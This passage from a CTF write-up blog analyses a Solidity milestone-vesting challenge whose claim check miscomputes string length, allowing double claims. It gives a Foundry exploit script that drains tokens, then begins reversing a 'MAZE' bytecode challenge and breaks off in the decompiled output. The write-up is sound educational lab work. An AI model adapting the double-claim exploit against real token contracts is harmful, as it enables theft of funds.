</pre><td class="rouge-code"><pre>    <span class="kd">function</span> <span class="nx">unlockMilestone</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">id</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">Milestone</span> <span class="nx">storage</span> <span class="nx">milestone</span> <span class="o">=</span> <span class="nx">milestones</span><span class="p">[</span><span class="nx">id</span><span class="p">];</span>
        <span class="nx">require</span><span class="p">(</span><span class="nx">milestone</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="nx">Status</span><span class="p">.</span><span class="nx">Locked</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Feel: milestone is already unlocked</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">require</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span> <span class="o">&gt;=</span> <span class="nx">milestone</span><span class="p">.</span><span class="nx">unlockTime</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Feel: milestone is not unlocked yet</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">milestone</span><span class="p">.</span><span class="nx">status</span> <span class="o">=</span> <span class="nx">Status</span><span class="p">.</span><span class="nx">Unlocked</span><span class="p">;</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>The user can unlock a milestone after 5 minutes (default).</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>    <span class="kd">function</span> <span class="nx">claimMilestone</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">id</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">Milestone</span> <span class="nx">storage</span> <span class="nx">milestone</span> <span class="o">=</span> <span class="nx">milestones</span><span class="p">[</span><span class="nx">id</span><span class="p">];</span>
        <span class="nx">require</span><span class="p">(</span><span class="nx">milestone</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="nx">Status</span><span class="p">.</span><span class="nx">Unlocked</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Feel: milestone is locked</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">uint256</span> <span class="nx">milestones_slot_key</span> <span class="o">=</span> <span class="nx">uint256</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encode</span><span class="p">(</span><span class="nx">id</span><span class="p">,</span> <span class="nx">MILESTONES_SLOT_KEY</span><span class="p">)));</span>
        <span class="nx">bytes32</span> <span class="nx">note_key</span> <span class="o">=</span> <span class="nx">bytes32</span><span class="p">(</span><span class="nx">milestones_slot_key</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
        <span class="nx">uint256</span> <span class="nx">string_length</span> <span class="o">=</span> <span class="nx">StorageSlot</span><span class="p">.</span><span class="nx">getUint256Slot</span><span class="p">(</span><span class="nx">note_key</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
        <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">note_bytes</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">string_length</span> <span class="o">&amp;</span> <span class="mh">0x1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">uint256</span> <span class="nx">length</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string_length</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">;</span>
            <span class="nx">bytes32</span> <span class="nx">note_bytes32</span> <span class="o">=</span> <span class="nx">StorageSlot</span><span class="p">.</span><span class="nx">getBytes32Slot</span><span class="p">(</span><span class="nx">note_key</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
            <span class="nx">note_bytes</span> <span class="o">=</span> <span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">note_bytes32</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">uint256</span> <span class="nx">length</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string_length</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
            <span class="nx">uint256</span> <span class="nx">extra_slots</span> <span class="o">=</span> <span class="p">(</span><span class="nx">length</span> <span class="o">+</span> <span class="mi">31</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">;</span>
            <span class="nx">uint256</span> <span class="nx">extra_slots_start</span> <span class="o">=</span> <span class="nx">uint256</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encode</span><span class="p">(</span><span class="nx">note_key</span><span class="p">)));</span>
            <span class="nx">note_bytes</span><span class="p">;</span>
            <span class="k">for</span> <span class="p">(</span><span class="nx">uint256</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">extra_slots</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">note_bytes</span> <span class="o">=</span> <span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">note_bytes</span><span class="p">,</span> <span class="nx">StorageSlot</span><span class="p">.</span><span class="nx">getBytes32Slot</span><span class="p">(</span><span class="nx">bytes32</span><span class="p">(</span><span class="nx">extra_slots_start</span> <span class="o">+</span> <span class="nx">i</span><span class="p">)).</span><span class="nx">value</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="nx">require</span><span class="p">(</span><span class="nx">findClaimString</span><span class="p">(</span><span class="nx">note_bytes</span><span class="p">)</span> <span class="o">==</span> <span class="kc">false</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Feel: milestone is already claimed</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">milestone</span><span class="p">.</span><span class="nx">note</span> <span class="o">=</span> <span class="nx">string</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">milestone</span><span class="p">.</span><span class="nx">note</span><span class="p">,</span> <span class="dl">"</span><span class="s2"> [CLAIMED]</span><span class="dl">"</span><span class="p">));</span>
        <span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">milestone</span><span class="p">.</span><span class="nx">recipient</span><span class="p">,</span> <span class="nx">milestone</span><span class="p">.</span><span class="nx">amount</span><span class="p">);</span>
        <span class="nx">milestoneCount</span> <span class="o">-=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>The user can claim a milestone with <code class="language-plaintext highlighter-rouge">claimMilestone</code> when its status is <code class="language-plaintext highlighter-rouge">Unlocked</code>. However, there’s a strange check for this condition.</p><p>First, it retrieves the storage value in the <code class="language-plaintext highlighter-rouge">note</code> of the milestone and checks if the first bit is set.</p><blockquote><p>In particular: if the data is at most <code class="language-plaintext highlighter-rouge">31</code> bytes long, the elements are stored in the higher-order bytes (left aligned) and the lowest-order byte stores the value <code class="language-plaintext highlighter-rouge">length * 2</code>. For byte arrays that store data which is <code class="language-plaintext highlighter-rouge">32</code> or more bytes long, the main slot <code class="language-plaintext highlighter-rouge">p</code> stores <code class="language-plaintext highlighter-rouge">length * 2 + 1</code> and the data is stored as usual in <code class="language-plaintext highlighter-rouge">keccak256(p)</code>. This means that you can distinguish a short array from a long array by checking if the lowest bit is set: short (not set) and long (set).</p></blockquote><p>If the length of the <code class="language-plaintext highlighter-rouge">note</code> is less than 32 bytes, it retrieves 32 bytes from storage directly. Otherwise, it calculates how many slots to retrieve based on the length of the string and then retrieves the entire string. It then checks for the presence of the <code class="language-plaintext highlighter-rouge">[CLAIMED]</code> substring in the <code class="language-plaintext highlighter-rouge">note</code>. The <code class="language-plaintext highlighter-rouge">findClaimString</code> function, created with GPT, has no bugs for this functionality :3</p><p>If the string <code class="language-plaintext highlighter-rouge">[CLAIMED]</code> is not found, the function appends the string to the <code class="language-plaintext highlighter-rouge">note</code>, sends the token to the user, and decreases <code class="language-plaintext highlighter-rouge">milestoneCount</code> by 1. This allows the possibility of creating a new milestone after claiming a milestone. However, the server timeout is <code class="language-plaintext highlighter-rouge">9 minutes</code></p><p>The bugs:</p><ol><li>The <code class="language-plaintext highlighter-rouge">note_bytes32</code> includes the length of the note, not just the data. However, this doesn’t affect the outcome in this challenge.<li>The length is calculated incorrectly using <code class="language-plaintext highlighter-rouge">(string_length &gt;&gt; 1) - 1</code> instead of the correct formula <code class="language-plaintext highlighter-rouge">(string_length - 1) &gt;&gt; 1</code>. As a result, the length is calculated as one less than the original length. This becomes problematic when the length is <code class="language-plaintext highlighter-rouge">32*n + 1</code>, especially <code class="language-plaintext highlighter-rouge">33</code>. In this case, the length is calculated as <code class="language-plaintext highlighter-rouge">32</code>, and the <code class="language-plaintext highlighter-rouge">extra_slots</code> is calculated as <code class="language-plaintext highlighter-rouge">1</code>. Consequently, one less slot is retrieved. If the length of the note after appending the <code class="language-plaintext highlighter-rouge">[CLAIMED]</code> string becomes <code class="language-plaintext highlighter-rouge">32*n + 1</code>, the last character <code class="language-plaintext highlighter-rouge">]</code> is missed, allowing the milestone to be claimed twice.</ol><h3 id="exploit-1">Exploit<a href="#exploit-1" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><hr /><div class="language-javascript highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Script</span><span class="p">,</span> <span class="nx">console</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Setup</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">src/challenge/Setup.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Feel</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">src/challenge/Feel.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">FeelToken</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">src/challenge/FeelToken.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="nx">contract</span> <span class="nx">ExploitScript</span> <span class="nx">is</span> <span class="nx">Script</span> <span class="p">{</span>
    <span class="kd">function</span> <span class="nx">run</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nx">startBroadcast</span><span class="p">();</span>
        <span class="nx">Setup</span> <span class="nx">setup</span> <span class="o">=</span> <span class="nx">Setup</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">envAddress</span><span class="p">(</span><span class="dl">"</span><span class="s2">SETUP</span><span class="dl">"</span><span class="p">));</span>
        <span class="nx">Feel</span> <span class="nx">feel</span> <span class="o">=</span> <span class="nx">Feel</span><span class="p">(</span><span class="nx">setup</span><span class="p">.</span><span class="nx">feel</span><span class="p">());</span>
        <span class="nx">FeelToken</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">FeelToken</span><span class="p">(</span><span class="nx">setup</span><span class="p">.</span><span class="nx">token</span><span class="p">());</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">timestamp 1</span><span class="dl">"</span><span class="p">,</span> <span class="nx">feel</span><span class="p">.</span><span class="nx">getTime</span><span class="p">());</span>
        <span class="k">for</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;=</span><span class="mi">10</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">){</span>
            <span class="nx">feel</span><span class="p">.</span><span class="nx">addMilestone</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span><span class="dl">"</span><span class="s2">xxxxxxxxxxxxxxxxxxxxxxx</span><span class="dl">"</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nx">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nx">run2</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nx">startBroadcast</span><span class="p">();</span>
        <span class="nx">Setup</span> <span class="nx">setup</span> <span class="o">=</span> <span class="nx">Setup</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">envAddress</span><span class="p">(</span><span class="dl">"</span><span class="s2">SETUP</span><span class="dl">"</span><span class="p">));</span>
        <span class="nx">Feel</span> <span class="nx">feel</span> <span class="o">=</span> <span class="nx">Feel</span><span class="p">(</span><span class="nx">setup</span><span class="p">.</span><span class="nx">feel</span><span class="p">());</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">timestamp 2</span><span class="dl">"</span><span class="p">,</span> <span class="nx">feel</span><span class="p">.</span><span class="nx">getTime</span><span class="p">());</span>
        <span class="nx">FeelToken</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">FeelToken</span><span class="p">(</span><span class="nx">setup</span><span class="p">.</span><span class="nx">token</span><span class="p">());</span>
        <span class="k">for</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;=</span><span class="mi">10</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">){</span>
            <span class="nx">feel</span><span class="p">.</span><span class="nx">unlockMilestone</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
            <span class="nx">feel</span><span class="p">.</span><span class="nx">claimMilestone</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
            <span class="nx">feel</span><span class="p">.</span><span class="nx">addMilestone</span><span class="p">(</span><span class="nx">i</span><span class="o">+</span><span class="mi">50</span><span class="p">,</span><span class="dl">"</span><span class="s2">xxxxxxxxxxxxxxxxxxxxxxx</span><span class="dl">"</span><span class="p">);</span>
            <span class="nx">feel</span><span class="p">.</span><span class="nx">claimMilestone</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">balance: </span><span class="dl">"</span><span class="p">,</span> <span class="nx">token</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">));</span>
        <span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">setup</span><span class="p">),</span> <span class="nx">token</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">));</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nx">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>The exploit scenario is:</p><ol><li>Add 10 milestones with notes of length <code class="language-plaintext highlighter-rouge">23</code> (after appending <code class="language-plaintext highlighter-rouge">[CLAIMED]</code>, the length will become <code class="language-plaintext highlighter-rouge">33</code>).<li>Wait 5 minutes to unlock the milestones, claim a milestone, and add some milestones to prevent underflow. Then, claim the same milestone again.</ol><h3 id="note-1">NOTE<a href="#note-1" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><hr /><p>This challenge is also inspired by a real-world case. lol</p><h2 id="maze">MAZE<a href="#maze" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p><code class="language-plaintext highlighter-rouge">final, 1 solve</code> <img data-src="/assets/img/2024-11-21-eth-escape/Pasted image 20241120041422.png" alt="img" data-proofer-ignore></p><p>The only one file was given. <code class="language-plaintext highlighter-rouge">Setup.sol</code></p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">25</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Setup</span> <span class="p">{</span>
    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">maze</span><span class="p">;</span>
    <span class="kd">constructor</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">code</span> <span class="o">=</span> <span class="nx">hex</span><span class="dl">"</span><span class="s2">61025e80600a3d393df35f3560e01c63deadbeef146100135761001c565b5f545f5260205ff35b7f41327924f1b91fe820120120804b93f9248e3926010092082080000036fbefb85f527f8c4f3a002402480003238db6237239920124124120b1db1249271c64120924006020527f24904920be1b9249246fa082092492003238e493c6fc9900120804824b7e47e46040527ff9fb9ff9dc9804020920904b927ee49249da0804004920131c9230c30c4990486060527f260920100904132493f7230df1904804120804c7e3fe7fe3e2640200000008316080527f4000b7279ff93bee64100000820831f11bf1c93ce804920104800ced89e7718f60a0526a013feff7ff7ffe8008040060c052610232610140525f610100525b6101005180361461024557600190610120376101205160f81c80607714610149578060611461018857806073146101c75780606414610206575b6101006031610140510361065090068080929004602002519061010090061c6001901660011461025c576101405250610100516001016101005261010f565b6101006001610140510361065090068080929004602002519061010090061c6001901660011461025c576101405250610100516001016101005261010f565b6101006031610140510161065090068080929004602002519061010090061c6001901660011461025c576101405250610100516001016101005261010f565b6101006001610140510161065090068080929004602002519061010090061c6001901660011461025c576101405250610100516001016101005261010f565b6101405161064f146102565761025c565b60015f55005b00</span><span class="dl">"</span><span class="p">;</span>
        <span class="nx">address</span> <span class="nx">_maze</span><span class="p">;</span>
        <span class="nx">assembly</span> <span class="p">{</span>
            <span class="nl">_maze</span> <span class="p">:</span><span class="o">=</span> <span class="nx">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">add</span><span class="p">(</span><span class="nx">code</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">),</span> <span class="nx">mload</span><span class="p">(</span><span class="nx">code</span><span class="p">))</span>
        <span class="p">}</span>
        <span class="nx">maze</span> <span class="o">=</span> <span class="nx">_maze</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kd">function</span> <span class="nx">isSolved</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">(</span><span class="nx">bool</span> <span class="nx">success</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">result</span><span class="p">)</span> <span class="o">=</span> <span class="nx">maze</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">hex</span><span class="dl">"</span><span class="s2">DEADBEEF</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">uint256</span> <span class="nx">ret</span> <span class="o">=</span> <span class="nx">abi</span><span class="p">.</span><span class="nx">decode</span><span class="p">(</span><span class="nx">result</span><span class="p">,</span> <span class="p">(</span><span class="nx">uint256</span><span class="p">));</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">ret</span> <span class="o">==</span> <span class="mh">0x1</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

</pre></table></code></div></div><p>When the <code class="language-plaintext highlighter-rouge">Setup</code> contract calls the maze contract with <code class="language-plaintext highlighter-rouge">DEADBEEF</code> as calldata, it should return <code class="language-plaintext highlighter-rouge">uint256(1)</code>.</p><h3 id="bytecode-reversing-with-decompiler">bytecode reversing with decompiler<a href="#bytecode-reversing-with-decompiler" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><hr /><div class="language-javascript highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">__function_selector__</span><span class="p">()</span> <span class="kr">private</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="mh">0xdeadbeef</span> <span class="o">==</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">224</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">CodeIsLawZ95677371</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">MEM</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x41327924f1b91fe820120120804b93f9248e3926010092082080000036fbefb8</span><span class="p">;</span>
        <span class="nx">MEM</span><span class="p">[</span><span class="mi">32</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x8c4f3a002402480003238db6237239920124124120b1db1249271c6412092400</span><span class="p">;</span>
        <span class="nx">MEM</span><span class="p">[</span><span class="mi">96</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xf9fb9ff9dc9804020920904b927ee49249da0804004920131c9230c30c499048</span><span class="p">;</span>
        <span class="nx">MEM</span><span class="p">[</span><span class="mi">128</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x260920100904132493f7230df1904804120804c7e3fe7fe3e264020000000831</span><span class="p">;</span>
        <span class="nx">MEM</span><span class="p">[</span><span class="mi">160</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4000b7279ff93bee64100000820831f11bf1c93ce804920104800ced89e7718f</span><span class="p">;</span>
        <span class="nx">MEM</span><span class="p">[</span><span class="mi">192</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x13feff7ff7ffe80080400</span><span class="p">]</span>
        <span class="nx">MEM</span><span class="p">[</span><span class="mi">320</span><span class="p">]</span> <span class="o">=</span> <span class="mi">562</span><span class="p">;</span>
        <span class="k">while</span> <span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">length</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">CALLDATACOPY</span><span class="p">(</span><span class="mi">288</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="mi">119</span> <span class="o">!=</span> <span class="nx">MEM</span><span class="p">[</span><span class="mi">288</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">248</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="mi">97</span> <span class="o">==</span> <span class="nx">MEM</span><span class="p">[</span><span class="mi">288</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">248</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="mi">1</span> <span class="o">!=</span> <span class="nx">MEM</span><span class="p">[(</span><span class="nx">MEM</span><span class="p">[</span><span class="mi">320</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">1616</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="nx">MEM</span><span class="p">[</span><span class="mi">320</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">1616</span> <span class="o">%</span> <span class="p">(</span><span class="nx">uint8</span><span class="p">.</span><span class="nx">max</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x1</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">MEM</span><span class="p">[</span><span class="mi">320</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">MEM</span><span class="p">[</span><span class="mi">320</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">1616</span><span class="p">;</span>
                        <span class="nx">MEM</span><span class="p">[</span><span class="nx">uint8</span><span class="p">.</span><span class="nx">max</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="mi">115</span> <span class="o">==</span> <span class="nx">MEM</span><span class="p">[</span><span class="mi">288</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">248</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="mi">1</span> <span class="o">!=</span> <span class="nx">MEM</span><span class="p">[(</span><span class="nx">MEM</span><span class="p">[</span><span class="mi">320</span><span class="p">]</span> <span class="o">+</span> <span class="mi">49</span><span class="p">)</span> <span class="o">%</span> <span class="mi">1616</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="nx">MEM</span><span class="p">[</span><span class="mi">320</span><span class="p">]</span> <span class="o">+</span> <span class="mi">49</span><span class="p">)</span> <span class="o">%</span> <span class="mi">1616</span> <span class="o">%</span> <span class="p">(</span><span class="nx">uint8</span><span class="p">.</span><span class="nx">max</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x1</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">MEM</span><span class="p">[</span><span class="mi">320</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">MEM</span><span class="p">[</span><span class="mi">320</span><span class="p">]</span> <span class="o">+</span> <span class="mi">49</span><span class="p">)</span> <span class="o">%</span> <span class="mi">1616</span><span class="p">;</span>
                        <span class="nx">MEM</span><span class="p">[</span><span class="nx">uint8</span><span class="p">.</span><span class="nx">max</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="mi">100</span> <span class="o">==</span> <span class="nx">MEM</span><span class="p">[</span><span class="mi">288</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">248</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="mi">1</span> <span class="o">!=</span> <span class="nx">MEM</span><span class="p">[(</span><span class="nx">MEM</span><span class="p">[</span><span class="mi">320</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">1616</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="nx">MEM</span><span class="p">[</span><span class="mi">320</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">1616</span> <span class="o">%</span> <span class="p">(</span><span class="nx">uint8</span><span class="p">.</span><span class="nx">max</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x1</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">MEM</span><span class="p">[</span><span class="mi">320</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">MEM</span><span class="p">[</span><span class="mi">320</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">1616</span><span class="p">;</span>
